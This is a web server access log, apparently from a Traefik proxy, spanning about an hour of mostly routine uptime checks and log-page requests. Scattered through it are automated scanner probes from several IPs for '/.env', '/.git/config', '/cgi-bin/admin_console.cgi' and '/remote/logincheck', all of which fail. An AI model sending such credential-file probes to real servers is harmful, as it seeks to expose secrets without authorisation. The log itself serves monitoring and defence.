167.71.120.76 - - [20/Dec/2023:14:25:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1863 "www@docker" "http://172.20.0.9:80" 1ms
129.55.200.20 - - [20/Dec/2023:14:25:36 +0000] "GET /logs/logtail.php?page=1 HTTP/2.0" 200 1946 "-" "-" 1864 "logpager@docker" "http://172.20.0.3:80" 6ms
129.55.200.20 - - [20/Dec/2023:14:25:39 +0000] "GET /logs/logtail.php?page=2 HTTP/2.0" 200 1994 "-" "-" 1865 "logpager@docker" "http://172.20.0.3:80" 18ms
129.55.200.20 - - [20/Dec/2023:14:25:45 +0000] "GET /logs/logtail.php?page=3 HTTP/2.0" 200 2017 "-" "-" 1866 "logpager@docker" "http://172.20.0.3:80" 12ms
129.55.200.20 - - [20/Dec/2023:14:25:47 +0000] "GET /logs/logtail.php?page=4 HTTP/2.0" 200 1964 "-" "-" 1867 "logpager@docker" "http://172.20.0.3:80" 14ms
129.55.200.20 - - [20/Dec/2023:14:25:48 +0000] "GET /logs/logtail.php?page=5 HTTP/2.0" 200 1941 "-" "-" 1868 "logpager@docker" "http://172.20.0.3:80" 18ms
129.55.200.20 - - [20/Dec/2023:14:25:52 +0000] "GET /logs/logtail.php?page=6 HTTP/2.0" 200 1949 "-" "-" 1869 "logpager@docker" "http://172.20.0.3:80" 27ms
129.55.200.20 - - [20/Dec/2023:14:25:53 +0000] "GET /logs/logtail.php?page=7 HTTP/2.0" 200 1945 "-" "-" 1870 "logpager@docker" "http://172.20.0.3:80" 31ms
159.203.109.206 - - [20/Dec/2023:14:26:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1871 "www@docker" "http://172.20.0.9:80" 0ms
165.154.120.226 - - [20/Dec/2023:14:26:26 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 1872 "-" "-" 0ms
167.71.120.76 - - [20/Dec/2023:14:26:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1873 "www@docker" "http://172.20.0.9:80" 0ms
165.154.120.226 - - [20/Dec/2023:14:26:47 +0000] "GET /favicon.ico HTTP/1.1" 404 19 "-" "-" 1874 "-" "-" 0ms
165.154.120.226 - - [20/Dec/2023:14:26:49 +0000] "GET /robots.txt HTTP/1.1" 404 19 "-" "-" 1875 "-" "-" 0ms
165.154.120.226 - - [20/Dec/2023:14:26:51 +0000] "GET /sitemap.xml HTTP/1.1" 404 19 "-" "-" 1876 "-" "-" 0ms
159.203.109.206 - - [20/Dec/2023:14:27:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1877 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:14:27:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1878 "www@docker" "http://172.20.0.9:80" 0ms
165.154.120.226 - - [20/Dec/2023:14:27:58 +0000] "GET /cgi-bin/admin_console.cgi HTTP/1.1" 404 19 "-" "-" 1879 "-" "-" 0ms
159.203.109.206 - - [20/Dec/2023:14:28:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1880 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:14:28:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1881 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:14:29:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1882 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:14:29:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1883 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:14:30:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1884 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:14:30:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1885 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:14:31:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1886 "www@docker" "http://172.20.0.9:80" 1ms
167.71.120.76 - - [20/Dec/2023:14:31:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1887 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:14:32:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1888 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:14:32:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1889 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:14:33:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1890 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:14:33:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1891 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:14:34:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1892 "www@docker" "http://172.20.0.9:80" 1ms
167.71.120.76 - - [20/Dec/2023:14:34:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1893 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:14:35:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1894 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:14:35:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1895 "www@docker" "http://172.20.0.9:80" 0ms
95.37.222.152 - - [20/Dec/2023:14:35:49 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 1896 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [20/Dec/2023:14:36:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1897 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:14:36:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1898 "www@docker" "http://172.20.0.9:80" 1ms
95.214.235.169 - - [20/Dec/2023:14:36:49 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 1899 "web-to-websecure@internal" "-" 0ms
95.214.235.169 - - [20/Dec/2023:14:36:49 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 1900 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [20/Dec/2023:14:37:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1901 "www@docker" "http://172.20.0.9:80" 1ms
167.71.120.76 - - [20/Dec/2023:14:37:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1902 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:14:38:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1903 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:14:38:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1904 "www@docker" "http://172.20.0.9:80" 1ms
78.153.140.219 - - [20/Dec/2023:14:39:01 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 1905 "web-to-websecure@internal" "-" 0ms
78.153.140.219 - - [20/Dec/2023:14:39:02 +0000] "GET /.env HTTP/1.1" 404 19 "-" "-" 1906 "-" "-" 0ms
78.153.140.219 - - [20/Dec/2023:14:39:02 +0000] "GET /.env HTTP/1.1" 404 19 "-" "-" 1907 "-" "-" 0ms
159.203.109.206 - - [20/Dec/2023:14:39:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1908 "www@docker" "http://172.20.0.9:80" 1ms
167.71.120.76 - - [20/Dec/2023:14:39:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1909 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:14:40:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1910 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:14:40:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1911 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:14:41:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1912 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:14:41:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1913 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:14:42:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1914 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:14:42:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1915 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:14:43:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1916 "www@docker" "http://172.20.0.9:80" 1ms
167.71.120.76 - - [20/Dec/2023:14:43:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1917 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:14:44:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1918 "www@docker" "http://172.20.0.9:80" 1ms
167.71.120.76 - - [20/Dec/2023:14:44:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1919 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:14:45:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1920 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:14:45:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1921 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:14:46:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1922 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:14:46:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1923 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:14:47:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1924 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:14:47:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1925 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:14:48:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1926 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:14:48:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1927 "www@docker" "http://172.20.0.9:80" 1ms
65.49.20.68 - - [20/Dec/2023:14:48:54 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 1928 "-" "-" 0ms
159.203.109.206 - - [20/Dec/2023:14:49:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1929 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:14:49:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1930 "www@docker" "http://172.20.0.9:80" 1ms
165.154.100.42 - - [20/Dec/2023:14:50:09 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 1931 "-" "-" 0ms
159.203.109.206 - - [20/Dec/2023:14:50:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1932 "www@docker" "http://172.20.0.9:80" 1ms
165.154.100.42 - - [20/Dec/2023:14:50:29 +0000] "GET /favicon.ico HTTP/1.1" 404 19 "-" "-" 1933 "-" "-" 0ms
165.154.100.42 - - [20/Dec/2023:14:50:31 +0000] "GET /robots.txt HTTP/1.1" 404 19 "-" "-" 1934 "-" "-" 0ms
165.154.100.42 - - [20/Dec/2023:14:50:33 +0000] "GET /sitemap.xml HTTP/1.1" 404 19 "-" "-" 1935 "-" "-" 0ms
167.71.120.76 - - [20/Dec/2023:14:50:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1936 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:14:51:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1937 "www@docker" "http://172.20.0.9:80" 1ms
167.71.120.76 - - [20/Dec/2023:14:51:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1938 "www@docker" "http://172.20.0.9:80" 0ms
165.154.100.42 - - [20/Dec/2023:14:52:03 +0000] "GET /cgi-bin/admin_console.cgi HTTP/1.1" 404 19 "-" "-" 1939 "-" "-" 0ms
159.203.109.206 - - [20/Dec/2023:14:52:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1940 "www@docker" "http://172.20.0.9:80" 1ms
167.71.120.76 - - [20/Dec/2023:14:52:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1941 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:14:53:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1942 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:14:53:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1943 "www@docker" "http://172.20.0.9:80" 1ms
185.134.22.149 - - [20/Dec/2023:14:54:00 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 1944 "-" "-" 0ms
185.134.22.149 - - [20/Dec/2023:14:54:03 +0000] "GET /Ep1v HTTP/1.1" 404 19 "-" "-" 1945 "-" "-" 0ms
185.134.22.149 - - [20/Dec/2023:14:54:05 +0000] "GET /GWqN HTTP/1.1" 404 19 "-" "-" 1946 "-" "-" 0ms
159.203.109.206 - - [20/Dec/2023:14:54:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1947 "www@docker" "http://172.20.0.9:80" 1ms
167.71.120.76 - - [20/Dec/2023:14:54:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1948 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:14:55:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1949 "www@docker" "http://172.20.0.9:80" 1ms
167.71.120.76 - - [20/Dec/2023:14:55:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1950 "www@docker" "http://172.20.0.9:80" 0ms
65.49.20.68 - - [20/Dec/2023:14:55:40 +0000] "GET /favicon.ico HTTP/1.1" 404 19 "-" "-" 1951 "-" "-" 0ms
159.203.109.206 - - [20/Dec/2023:14:56:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1952 "www@docker" "http://172.20.0.9:80" 0ms
65.49.20.68 - - [20/Dec/2023:14:56:30 +0000] "GET /dns-query?name=dnsscan.shadowserver.org&type=A HTTP/1.1" 404 19 "-" "-" 1953 "-" "-" 0ms
165.154.118.215 - - [20/Dec/2023:14:56:33 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 1954 "-" "-" 0ms
167.71.120.76 - - [20/Dec/2023:14:56:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1955 "www@docker" "http://172.20.0.9:80" 1ms
165.154.118.215 - - [20/Dec/2023:14:56:54 +0000] "GET /favicon.ico HTTP/1.1" 404 19 "-" "-" 1956 "-" "-" 0ms
143.110.222.166 - - [20/Dec/2023:14:56:57 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 1957 "web-to-websecure@internal" "-" 0ms
65.49.20.68 - - [20/Dec/2023:14:56:57 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 1958 "-" "-" 0ms
165.154.118.215 - - [20/Dec/2023:14:56:58 +0000] "GET /robots.txt HTTP/1.1" 404 19 "-" "-" 1959 "-" "-" 0ms
165.154.118.215 - - [20/Dec/2023:14:57:00 +0000] "GET /sitemap.xml HTTP/1.1" 404 19 "-" "-" 1960 "-" "-" 0ms
143.110.222.166 - - [20/Dec/2023:14:57:03 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 1961 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [20/Dec/2023:14:57:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1962 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:14:57:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1963 "www@docker" "http://172.20.0.9:80" 0ms
165.154.118.215 - - [20/Dec/2023:14:58:11 +0000] "GET /cgi-bin/admin_console.cgi HTTP/1.1" 404 19 "-" "-" 1964 "-" "-" 0ms
159.203.109.206 - - [20/Dec/2023:14:58:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1965 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:14:58:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1966 "www@docker" "http://172.20.0.9:80" 0ms
205.210.31.35 - - [20/Dec/2023:14:59:09 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 1967 "web-to-websecure@internal" "-" 0ms
65.49.20.68 - - [20/Dec/2023:14:59:10 +0000] "GET /api/v2/static/not.found HTTP/1.1" 404 19 "-" "-" 1968 "-" "-" 0ms
159.203.109.206 - - [20/Dec/2023:14:59:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1969 "www@docker" "http://172.20.0.9:80" 0ms
65.49.20.68 - - [20/Dec/2023:14:59:23 +0000] "GET /remote/logincheck HTTP/1.1" 404 19 "-" "-" 1970 "-" "-" 0ms
167.71.120.76 - - [20/Dec/2023:14:59:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1971 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:15:00:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1972 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:15:00:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1973 "www@docker" "http://172.20.0.9:80" 0ms
65.49.20.68 - - [20/Dec/2023:15:00:55 +0000] "GET /geoserver/web/ HTTP/1.1" 404 19 "-" "-" 1974 "-" "-" 0ms
57.129.23.166 - - [20/Dec/2023:15:00:56 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 1975 "web-to-websecure@internal" "-" 0ms
57.129.23.166 - - [20/Dec/2023:15:00:56 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 1976 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [20/Dec/2023:15:01:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1977 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:15:01:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1978 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:15:02:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1979 "www@docker" "http://172.20.0.9:80" 1ms
167.71.120.76 - - [20/Dec/2023:15:02:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1980 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:15:03:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1981 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:15:03:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1982 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:15:04:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1983 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:15:04:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1984 "www@docker" "http://172.20.0.9:80" 1ms
152.32.247.41 - - [20/Dec/2023:15:04:44 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 1985 "web-to-websecure@internal" "-" 0ms
152.32.247.41 - - [20/Dec/2023:15:04:55 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 1986 "-" "-" 0ms
159.203.109.206 - - [20/Dec/2023:15:05:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1987 "www@docker" "http://172.20.0.9:80" 1ms
167.71.120.76 - - [20/Dec/2023:15:05:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1988 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:15:06:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1989 "www@docker" "http://172.20.0.9:80" 1ms
167.71.120.76 - - [20/Dec/2023:15:06:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1990 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:15:07:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1991 "www@docker" "http://172.20.0.9:80" 1ms
167.71.120.76 - - [20/Dec/2023:15:07:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1992 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:15:08:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1993 "www@docker" "http://172.20.0.9:80" 1ms
167.71.120.76 - - [20/Dec/2023:15:08:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1994 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:15:09:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1995 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:15:09:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1996 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:15:10:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1997 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:15:10:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1998 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:15:11:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1999 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:15:11:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2000 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:15:12:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2001 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:15:12:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2002 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:15:13:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2003 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:15:13:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2004 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:15:14:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2005 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:15:14:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2006 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:15:15:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2007 "www@docker" "http://172.20.0.9:80" 1ms
167.71.120.76 - - [20/Dec/2023:15:15:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2008 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:15:16:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2009 "www@docker" "http://172.20.0.9:80" 1ms
167.71.120.76 - - [20/Dec/2023:15:16:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2010 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:15:17:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2011 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:15:17:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2012 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:15:18:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2013 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:15:18:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2014 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:15:19:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2015 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:15:19:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2016 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:15:20:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2017 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:15:20:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2018 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:15:21:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2019 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:15:21:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2020 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:15:22:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2021 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:15:22:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2022 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:15:23:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2023 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:15:23:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2024 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:15:24:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2025 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:15:24:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2026 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:15:25:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2027 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:15:25:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2028 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:15:26:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2029 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:15:26:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2030 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:15:27:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2031 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:15:27:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2032 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:15:28:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2033 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:15:28:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2034 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:15:29:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2035 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:15:29:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2036 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:15:30:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2037 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:15:30:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2038 "www@docker" "http://172.20.0.9:80" 0ms
91.92.241.63 - - [20/Dec/2023:15:30:37 +0000] "GET /.git/config HTTP/1.1" 301 17 "-" "-" 2039 "web-to-websecure@internal" "-" 0ms
91.92.241.63 - - [20/Dec/2023:15:30:38 +0000] "GET /.git/config HTTP/1.1" 404 19 "-" "-" 2040 "-" "-" 0ms
159.203.109.206 - - [20/Dec/2023:15:31:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2041 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:15:31:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2042 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:15:32:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2043 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:15:32:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2044 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:15:33:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2045 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:15:33:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2046 "www@docker" "http://172.20.0.9:80" 1ms
